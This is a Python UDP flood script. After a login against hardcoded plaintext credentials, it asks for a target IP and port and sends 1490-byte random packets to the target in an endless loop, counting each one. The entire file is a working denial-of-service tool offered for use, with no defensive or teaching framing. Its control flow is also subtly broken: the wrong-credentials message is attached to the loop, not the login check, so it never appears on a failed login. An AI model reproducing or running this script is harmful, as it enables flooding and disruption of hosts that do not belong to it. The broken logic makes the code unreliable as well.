# Import Modules
import os
import banner
import random
import socket
from time import sleep
from colorama import Fore
from getpass import getpass

# login credentials
credentials = ["nurhabib", "pass@@@111"]

username = input(Fore.LIGHTBLACK_EX + "Enter Username: ")
password = getpass("Enter Passkeys: ")

# check username and password
def mainFunction():
    # take username and password from user
    if username == credentials[0] and password == credentials[1]:
        try:
            print("Login Successfully")
            sleep(3)
            os.system("clear")
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1490)
            ipAddress = input("Enter Target IP Address: ")
            portNumber = int(input("Enter Target Port Number: "))
            sendPackets = 0
            while True:
                sock.sendto(bytes, (ipAddress, portNumber))
                sendPackets = sendPackets + 1
                print(
                    Fore.GREEN
                    + f"Successfully {sendPackets} Packets sent to {ipAddress}"
                )

            else:
                print(Fore.RED + "Wrong Credentials, Please Try Again!!!")
        except Exception as error:
            print(f"An error occound : {error}")


if __name__ == "__main__":
    mainFunction()
